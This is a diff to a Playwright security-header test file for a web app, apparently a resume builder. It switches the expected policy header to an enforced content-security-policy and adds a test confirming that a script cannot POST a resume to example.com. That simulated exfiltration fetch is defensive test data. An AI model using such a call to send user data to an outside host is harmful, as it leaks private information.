@@ -5,7 +5,7 @@ import nextConfig from "../next.config.js"
 // pages, files, and the scripts its workers start from, which take their
 // policy from their own response rather than from the page's.
 
-const NAMES = ["content-security-policy-report-only", "x-frame-options", "x-content-type-options", "referrer-policy", "permissions-policy"]
+const NAMES = ["content-security-policy", "x-frame-options", "x-content-type-options", "referrer-policy", "permissions-policy"]
 
 // The home page and the dashboard, a page built for each template, the editor
 // at a resume's address, the page Google's sign-in comes back to, and one
@@ -73,4 +73,29 @@ test.describe("security headers", () => {
       await expectSecurityHeaders(await request.get(url), url)
     }
   })
+})
+
+// What the policy is for: a script on the site, as one in a compromised
+// package update, can't send a resume to a site connect-src doesn't name.
+test("the content security policy refuses to send anything to a site it doesn't name", async ({ page }) => {
+  // A request the policy let through would be answered here, not sent on.
+  let sent = false
+  await page.route("https://example.com/**", (route) => {
+    sent = true
+    return route.fulfill({ body: "" })
+  })
+  await page.goto("/create/dashboard")
+  const result = await page.evaluate(async () => {
+    const refused = new Promise<string>((resolve) =>
+      document.addEventListener("securitypolicyviolation", (event) => resolve(event.effectiveDirective), { once: true }),
+    )
+    // no-cors, so a request let through resolves rather than failing on the answer's missing CORS header.
+    const fetched = await fetch("https://example.com/", { method: "POST", body: "a resume", mode: "no-cors" }).then(
+      () => true,
+      () => false,
+    )
+    return { fetched, directive: await refused }
+  })
+  expect(result).toEqual({ fetched: false, directive: "connect-src" })
+  expect(sent).toBe(false)
 })
